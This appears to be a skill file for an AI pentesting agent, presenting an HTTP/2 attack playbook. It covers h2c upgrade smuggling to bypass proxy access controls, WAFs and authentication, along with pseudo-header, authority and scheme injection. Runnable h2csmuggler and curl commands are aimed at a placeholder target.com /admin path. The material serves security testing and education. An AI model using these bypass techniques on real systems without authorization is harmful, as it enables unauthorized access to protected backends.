---
name: http2-specific-attacks
description: >-
  HTTP/2 protocol-specific attack playbook. Use when the target supports HTTP/2 and you need to exploit binary framing, HPACK compression, h2c upgrade smuggling, pseudo-header injection, stream multiplexing abuse, or H2→H1 downgrade translation flaws.
---

# SKILL: HTTP/2 Specific Attacks — Expert Attack Playbook

<!-- zhiyugo:contract:start -->
## ZhiyuGo workflow

Catalog mirror: `role=leaf`, `risk=active`, `default=disabled`. Trusted `policy.json` remains authoritative.

- Keep this default-disabled workflow in planning and reference mode. Catalog body inspection does not authorize network interaction or state changes.
- Define an exact in-scope subject, stable baseline, one-variable test, negative control, expected evidence, and stop condition before any future activation.
- The lightweight kernel supports bounded GET/HEAD requests, file reads/searches, and explicit-port TCP connect scans only; do not emulate POST, browser, shell, or exploit operations.
- Separate a candidate hypothesis from a verified finding and cite Evidence IDs.
<!-- zhiyugo:contract:end -->

> **Technical reference scope**: HTTP/2 protocol-level attack techniques beyond basic request smuggling. Covers h2c smuggling, pseudo-header manipulation, HPACK attacks, single-packet race conditions, and H2→H1 downgrade injection. baseline analyses conflate HTTP/2 smuggling with HTTP/1.1 smuggling — this skill focuses on H2-unique attack surface.

## 0. RELATED ROUTING

- `request-smuggling` — CL.TE/TE.CL/TE.TE fundamentals and H2.CL/H2.TE variants
- request-smuggling/H2_SMUGGLING_VARIANTS.md reference in the canonical `request-smuggling` Skill — byte-level H2.CL/H2.TE payloads, CL.0, client-side desync
- `race-condition` — single-packet attack leverages H2 multiplexing for race conditions
- `web-cache-deception` — cache poisoning via H2 smuggled responses

---

## 1. HTTP/2 ATTACK SURFACE OVERVIEW

| Feature | Attack Surface |
|---|---|
| Binary framing | Frame-level manipulation, parser differentials |
| HPACK compression | Compression oracles (CRIME/BREACH), table poisoning |
| Multiplexing | Single-packet race conditions, RST_STREAM flood |
| Server push | Cache poisoning via unsolicited push |
| Pseudo-headers (`:method`/`:path`/`:authority`/`:scheme`) | Injection, request splitting, path discrepancy |

---

## 2. h2c (HTTP/2 CLEARTEXT) SMUGGLING

### 2.1 Concept

h2c is HTTP/2 without TLS, negotiated via the HTTP/1.1 `Upgrade` mechanism. Many reverse proxies forward the `Upgrade: h2c` header without understanding it, allowing attackers to bypass proxy-level access controls.

```
Client ──[Upgrade: h2c]──> Reverse Proxy ──[forwards blindly]──> Backend
                                                                    │
                                                            Backend speaks H2
                                                            Proxy is blind to
                                                            the H2 conversation
```

### 2.2 Attack Flow

```
1. Client sends HTTP/1.1 request with:
   GET / HTTP/1.1
   Host: target.com
   Upgrade: h2c
   HTTP2-Settings: <base64 H2 settings>
   Connection: Upgrade, HTTP2-Settings

2. Proxy forwards request (doesn't understand h2c)
3. Backend responds: HTTP/1.1 101 Switching Protocols
4. Connection is now HTTP/2 between client and backend
5. Proxy is now a TCP tunnel — cannot inspect/filter H2 frames
6. Client sends H2 requests directly to backend, bypassing proxy rules
```

### 2.3 What You Can Bypass

```
✓ Path-based access controls (/admin blocked at proxy → accessible via h2c)
✓ WAF rules (proxy-side WAF can't inspect H2 binary frames)
✓ Rate limiting (proxy-level rate limits bypassed)
✓ Authentication (proxy-enforced auth headers)
✓ IP restrictions (proxy validates source IP, but h2c tunnel bypasses)
```

### 2.4 Tool: h2csmuggler

```bash
# Install
git clone https://github.com/BishopFox/h2csmuggler
cd h2csmuggler
pip3 install h2

# Basic smuggle — access /admin bypassing proxy restrictions
python3 h2csmuggler.py -x https://target.com/ --test

# Smuggle specific path
python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin/users

# With custom headers
python3 h2csmuggler.py -x https://target.com/ -X GET -p /admin \
    -H "Authorization: Bearer token123"
```

### 2.5 Detection

```bash
# Check if backend supports h2c upgrade
curl -v --http1.1 https://target.com/ \
    -H "Upgrade: h2c" \
    -H "HTTP2-Settings: AAMAAABkAAQCAAAAAAIAAAAA" \
    -H "Connection: Upgrade, HTTP2-Settings"

# 101 Switching Protocols → h2c supported
# 200/400/other → h2c not supported or proxy blocks upgrade
```

---

## 3. PSEUDO-HEADER INJECTION

### 3.1 HTTP/2 Pseudo-Headers

HTTP/2 replaces the request line with pseudo-headers (prefixed with `:`):

| Pseudo-Header | HTTP/1.1 Equivalent | Example |
|---|---|---|
| `:method` | Request method | `GET`, `POST` |
| `:path` | Request URI | `/api/users` |
| `:authority` | Host header | `target.com` |
| `:scheme` | Protocol | `https` |

### 3.2 Path Discrepancy Between Proxy and Backend

```
Scenario: Proxy routes based on :path, backend uses different parsing

H2 request:
  :method: GET
  :path: /public/../admin/users
  :authority: target.com

Proxy sees: /public/../admin/users → matches /public/* rule → ALLOWED
Backend normalizes: /admin/users → serves admin content
```

### 3.3 Duplicate Pseudo-Header Injection

HTTP/2 spec forbids duplicate pseudo-headers, but implementation varies:

```
:method: GET
:path: /public
:path: /admin       ← duplicate, forbidden by spec
:authority: target.com

Proxy may use first :path (/public) for routing
Backend may use last :path (/admin) for serving
```

### 3.4 Authority vs Host Disagreement

```
:authority: public.target.com    ← proxy routes based on this
host: admin.internal.target.com  ← backend may prefer Host header

Result: proxy routes to public vhost, backend serves admin vhost
```

### 3.5 Scheme Manipulation

```
:scheme: https
:path: /api/internal
:authority: target.com

If backend trusts :scheme to determine if request is "internal":
  :scheme: https → "external" → restricted
  :scheme: http  → "internal" → unrestricted access
```

---

## Detailed reference

Inspect [TECHNIQUE_REFERENCE.md](TECHNIQUE_REFERENCE.md) through explicit catalog resource tooling only when one of these advanced branches is required; the current Run does not load it automatically:

- 4. HPACK COMPRESSION ATTACKS
- 5. STREAM MULTIPLEXING ABUSE
- 6. HTTP/2 → HTTP/1.1 DOWNGRADE ISSUES
- 7. SERVER PUSH CACHE POISONING
- 8. DECISION TREE
- 9. TOOLS REFERENCE
- 10. QUICK REFERENCE
